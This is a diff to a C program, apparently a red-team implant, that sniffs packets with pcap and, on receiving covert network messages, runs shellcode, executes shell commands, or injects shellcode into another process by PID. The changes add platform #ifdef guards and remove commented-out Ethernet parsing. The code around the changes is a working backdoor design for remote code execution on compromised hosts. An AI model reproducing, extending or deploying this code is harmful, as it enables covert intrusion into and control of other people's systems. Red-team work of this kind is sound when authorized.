@@ -67,6 +67,8 @@ void send_packet(const uint8_t *data, uint32_t size, const struct ip_hdr *ip, co
 }
 
 int inject_remote_shellcode(uint16_t pid, const unsigned char *shellcode, uint32_t size) {
+
+#ifdef Linux
 	HIJACK *hijack = NULL;
 	unsigned long shellcode_addr;
 	REGS *backup = NULL;
@@ -196,6 +198,10 @@ int inject_remote_shellcode(uint16_t pid, const unsigned char *shellcode, uint32
 
 	Detach(hijack);
 	DEBUG_WRAP(fprintf(stderr, "Red team go!\n"));
+
+#else
+   DEBUG_WRAP(fprintf(stderr, "Shellcode injection only supported in Linux and Windows\n"));
+#endif
 	return 0;
 
 }
@@ -323,19 +329,30 @@ void process_message(const unsigned char *data, uint32_t size, const struct ip_h
 					// Make sure we are in the child
 					if(pid == 0) {
 						switch(msg_type) {
-							printf("Hello there\n");
-							case MESSAGE_SHELLCODE:
-								DEBUG_WRAP(fprintf(stderr, "Received shellcode packet\n"));
-								run_shellcode(decoded_data + hdr_len, data_len);
-								break;
-							case MESSAGE_COMMAND:
-								DEBUG_WRAP(fprintf(stderr, "Received command packet\n"));
-								run_command(decoded_data + hdr_len, data_len, ip, icmp);
-								break;
-							case MESSAGE_REMOTE_SHELLCODE:
-								DEBUG_WRAP(fprintf(stderr, "Received remote shellcode packet\n"));
-								inject_remote_shellcode(*(uint16_t *)(decoded_data + hdr_len),decoded_data + hdr_len + 2, data_len - 1);
-								break;
+                     case MESSAGE_SHELLCODE:
+                        DEBUG_WRAP(fprintf(stderr, "Received shellcode packet\n"));
+                        #ifdef FreeBSD
+                           DEBUG_WRAP(fprintf(stderr, "Shellcode not currently supported on FreeBSD"));
+                        #else
+                           run_shellcode(decoded_data + hdr_len, data_len);
+                        #endif
+                        break;
+                     case MESSAGE_COMMAND:
+                        DEBUG_WRAP(fprintf(stderr, "Received command packet\n"));
+                        #ifdef Windows
+                           DEBUG_WRAP(fprintf(stderr, "Shell commands not currently supported for Windows"));
+                        #else
+                           run_command(decoded_data + hdr_len, data_len, ip, icmp);
+                        #endif
+                        break;
+                     case MESSAGE_REMOTE_SHELLCODE:
+                        DEBUG_WRAP(fprintf(stderr, "Received remote shellcode packet\n"));
+                        #ifdef FreeBSD
+                           DEBUG_WRAP(fprintf(stderr, "Shellcode not currently supported on FreeBSD"));
+                        #else
+                           inject_remote_shellcode(*(uint16_t *)(decoded_data + hdr_len),decoded_data + hdr_len + 2, data_len - 1);
+                        #endif
+                        break;
 						}
 
 						exit(0);
@@ -350,14 +367,10 @@ void process_message(const unsigned char *data, uint32_t size, const struct ip_h
 }
 
 void process_packet(u_char *user_data, const struct pcap_pkthdr *hdr, const u_char *pkt) {
-//	const struct ether_arp *ethernet = NULL;
 	const struct ip_hdr *ip = NULL;
 	const struct icmp_hdr *icmp = NULL;
 	uint32_t size_ip, size_icmp;//, size_data;
 	const unsigned char *data = NULL;
-
-	// Ethernet
-	//ethernet = (struct ether_arp *)pkt;
 
 	// IP
 	ip = (struct ip_hdr *)(pkt + SIZE_ETHERNET);
@@ -424,4 +437,3 @@ int main(int argc, char **argv) {
 
 	return 0;
 }
-
